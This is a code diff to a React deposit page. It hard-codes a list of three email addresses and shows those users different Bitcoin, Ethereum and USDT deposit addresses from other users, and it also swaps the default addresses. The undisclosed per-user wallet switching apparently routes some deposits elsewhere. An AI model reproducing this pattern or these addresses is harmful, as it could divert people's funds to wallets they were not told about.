@@ -26,22 +26,26 @@ const Deposite = () => {
   }, [email]);
 
   // ✅ CONDITION
-  const isSpecialUser =
-  user?.email === "mosessixcojohn123@gmail.com" ||
-  user?.email === "mosessixco218@gmail.com";
+  const specialUsers = [
+  "mosessixcojohn123@gmail.com",
+  "mosessixco218@gmail.com",
+  "Recoverymanaget555@gmail.com",
+];
+
+const isSpecialUser = specialUsers.includes(user?.email);
 
   // ✅ WALLET SWITCHING
   const btcAddress = isSpecialUser
     ? "bc1q7ppeu0vywh0fejmjc7jznq9nf50xj0p0jkddz8"
-    : "19sY932BMVqbP9eP54qWsiYNBuFmy2eXgJ";
+    : "1GNu6gMQMR2rWxZubMQ46icSSuTUbrNZLZ";
 
   const ethAddress = isSpecialUser
     ? "0x422D59551478E493b8e4489a308dA7ca34054eB3"
-    : "0xf095ead86782d5ec852e0bd40d52dfb6bd4a08b6";
+    : "0x18562342774d0f6db54264edcdc650a6e2c7d45c";
 
   const usdtAddress = isSpecialUser
     ? "TGMSYN1kCo8egaaAtNugu3qrLXnCdjuetQ"
-    : "TKym8FK6kaLgKzGQnJx9oRmcWWYHYHdnx9";
+    : "TAjZkvRtK5cdoG11udBx628Ncw8mPSh2Sc";
 
   const handleCopy = async (textToCopy) => {
     try {
